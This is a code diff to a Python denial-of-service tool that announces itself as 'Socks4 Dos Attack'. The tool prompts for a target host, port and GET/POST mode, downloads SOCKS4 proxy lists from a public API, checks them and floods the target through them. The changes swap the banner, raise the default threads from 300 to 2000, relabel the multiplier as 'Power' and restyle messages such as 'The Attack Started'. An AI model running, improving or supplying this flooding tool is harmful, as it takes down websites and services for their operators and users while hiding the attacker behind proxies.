@@ -8,28 +8,21 @@ import requests
 import socks
 import ssl
 
-print('''\r\n
-     / \
-    / _ \
-   | / \ |
-   ||   || _______
-   ||   || |\     \
-   ||   || ||\     \
-   ||   || || \    |
-   ||   || ||  \__/
-   ||   || ||   ||
-    \\_/ \_/ \_//
-   /   _     _   \
-  /               \
-  |    O     O    |
-  |   \  ___  /   |                           
- /     \ \_/ /     \
-/  -----  |  --\    \
-|     \__/|\__/ \   |
-\       |_|_|       /
- \_____       _____/
-       \ DOS /
-       |SOCKS4|\r\n''')
+print (''' \033[91m
+      .---.        .-----------
+     /     \  __  /    ------
+    / /     \(..)/    -----
+   //////   ' \/ `   ---
+  //// / // :    : ---
+ // /   /  /`    '--
+//          //..\\
+       ====UU====UU====
+           '//||\\`
+             ''``
+           ASPARTIM
+------------------------------- \033[0m ''')
+print("\033[94mSocks4 Dos Attack\033[0m")
+print(" ")
 
 useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
             "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
@@ -182,7 +175,7 @@ strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
 def clone():
     f = open("socks4.txt", 'wb')
     try:
-        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all&timeout=1800")
+        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all&timeout=700")
         f.write(r.content)
     except:
         pass
@@ -192,7 +185,7 @@ def clone():
         f.close()
     except:
         f.close()
-    print("Socks Downloaded Sucessful !")
+    print("[✓] Socks Downloaded Sucessful !")
 
 def main():
     global ip
@@ -202,61 +195,61 @@ def main():
     global proxies
     global multiple
     global mode
-    mode = str(input("Mode You Want To Choose (get/post):"))
+    mode = str(input("[+] Mode You Want To Choose (get/post) : "))
     if mode == "":
         mode = "get"
     else:
         mode = str(mode)
     if mode == "get" or mode == "GET":
-        print("GET Mode Selected")
+        print("[✓] GET Mode Selected")
     elif mode == "post" or mode == "POST":
-        print("POST Mode Selected")
-    ip = str(input("Address/Host:"))
+        print("[✓] POST Mode Selected")
+    ip = str(input("[+] Address / Host : "))
     if ip == "":
-        print("Wrong Input! Please Try Again!")
+        print("[!] Please Try Again !")
         return main()
-    page = str(input("Page (default=/):"))
+    page = str(input("[+] Page (default=/) : "))
     if page == "":
         page = "/"
-    port = str(input("Port (HTTPS=443):"))
+    port = str(input("[+] Port (Default=80) : "))
     if port =="":
         port = 80
-        print("Port 80 Has Been Selected")
+        print("[✓] Port 80 Has Been Selected")
     else:
         port = int(port)
     if port == 443:
-        print("Port 443 Has Been Selected")        
-    th_num = str(input("Threads(default=300):"))
+        print("[✓] Port 443 Has Been Selected")        
+    th_num = str(input("[+] Threads (default=2000) : "))
     if th_num == "":
-        th_num = int(300)
+        th_num = int(2000)
     else:
         th_num = int(th_num)
     #if mode == "get" or mode == "GET":
-    N = str(input("Download socks4 list ?(y/n):"))
+    N = str(input("[+] Download Socks4 List ? (y/n) : "))
     if N == "n" or N =="N":
         pass
     else:
         clone()
-    out_file = str(input("Enter Proxy File Path(socks4.txt):"))
+    out_file = str(input("[+] Enter Proxy File Path(socks4.txt) : "))
     if out_file == "":
         out_file = "socks4.txt"
     else:
         out_file = str(out_file)
-    print ("Number Of Socks4 Proxies: %s" %(len(open(out_file).readlines())))
+    print ("[+] Number Of Socks4 Proxies : %s" %(len(open(out_file).readlines())))
     proxies = open(out_file).readlines()
     time.sleep(0.3)
-    ans = str(input("Check the socks list?(y/n, defualt=y):"))
+    ans = str(input("[+] Check The Socks List ? (y/n, defualt=y) : "))
     if ans == "n" or ans =="N":
         pass
     else:
-        ms = str(input("Delay of socks(seconds, default=1):"))
+        ms = str(input("[+] Delay Of Socks (seconds, default=1) : "))
         if ms == "":
             ms = int(1)
         else :
             ms = int(ms)
     check_socks()
     proxies = open(out_file).readlines()
-    multiple = str(input("Input the Multiple(default=100):"))
+    multiple = str(input("[+] Power (default=100) : "))
     if multiple == "":
         multiple = int(100)
     else:
@@ -344,11 +337,11 @@ def check_socks():
 		th.start()
 		thread_list.append(th)
 		time.sleep(0.01)
-		sys.stdout.write("Checked "+str(nums)+" proxies\r")
+		sys.stdout.write("[+] Checked "+str(nums)+" proxies\r")
 		sys.stdout.flush()
 	for th in list(thread_list):
 		th.join()
-		sys.stdout.write("Checked "+str(nums)+" proxies\r")
+		sys.stdout.write("[+] Checked "+str(nums)+" proxies\r")
 		sys.stdout.flush()
 	print("\r\nChecked all proxies, Total Worked:"+str(len(proxies)))
 	with open("socks4.txt", 'wb') as fp:
@@ -374,7 +367,7 @@ while True:
             if n>=4:
                 n = 0
             time.sleep(0.1)
-            sys.stdout.write("["+str(key[n])+"]Flooding "+ip+page+":"+str(port)+"\r")
+            sys.stdout.write("["+str(key[n])+"] The Attack Started "+ip+page+":"+str(port)+"\r")
             sys.stdout.flush()
             n +=1
         except KeyboardInterrupt:
